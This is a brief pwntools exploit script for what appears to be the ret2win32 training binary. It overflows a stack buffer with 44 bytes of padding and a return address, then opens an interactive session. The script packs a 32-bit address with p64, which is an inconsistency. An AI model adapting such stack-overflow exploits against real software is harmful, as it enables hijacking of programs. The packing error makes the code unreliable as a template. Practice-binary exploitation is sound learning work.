#!/usr/bin/env python3

from pwn import * 

# Sets information about the binary that affects how the pointer is defined
context.bits = 32

# initalizing the process
pw = process("./ret2win32")

# attach the gdb debugger to the process and set a break point at a certain memory address
gdb.attach(pw, gdbscript = 'b *0x804862c')

# Recieve data until the > symbol
pw.recvuntil(b'>')

# sends the right amount of A's to buffer overflow while also sending the address we want
pw.sendline(b'A' * 44 + p64(0x804862c))

# allows us to interact with the process
pw.interactive()

